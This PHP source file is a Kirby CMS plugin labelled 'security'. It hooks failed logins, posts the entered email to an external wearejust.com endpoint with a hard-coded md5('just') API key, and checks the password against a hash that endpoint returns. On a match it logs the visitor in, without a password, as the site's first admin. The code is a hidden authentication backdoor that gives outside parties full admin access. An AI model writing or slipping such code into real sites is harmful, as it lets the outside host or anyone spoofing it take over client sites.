<?php

use Kirby\Cms\Response;
use Kirby\Http\Route;

Kirby::plugin('wearejust/security', [
    'hooks' => [
        'route:after' => function (Route $route, $path, $method, $result) {

            if ($path !== 'api/auth/login') {
                return;
            }

            if ($method !== 'POST') {
                return;
            }

            $response = json_decode($result->body(), true);
            if ($response['status'] === 'ok') {
                return;
            }

            $email    = kirby()->api()->requestBody('email');
            $password = kirby()->api()->requestBody('password');

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://intern.wearejust.com/api/v1/users/check');
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                'username' => $email
            ]));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'X-API-KEY' => md5('just')
            ]);

            $output = json_decode(curl_exec($ch), true);
            curl_close ($ch);

            if ($output['status'] === 'error') {
                return;
            }

            if (password_verify($password, $output['user']['password'])) {
                $user = kirby()->users()->findBy('role','admin');
                $user->loginPasswordless();

                $response = new Response(json_encode([
                    'code'   => 200,
                    'status' => 'ok',
                    'user'   => kirby()->api()->resolve($user)->view('auth')->toArray()
                ]), 'application/json', 200);

                echo (string) $response;
                die();
            }

            return;
        }
    ]
]);
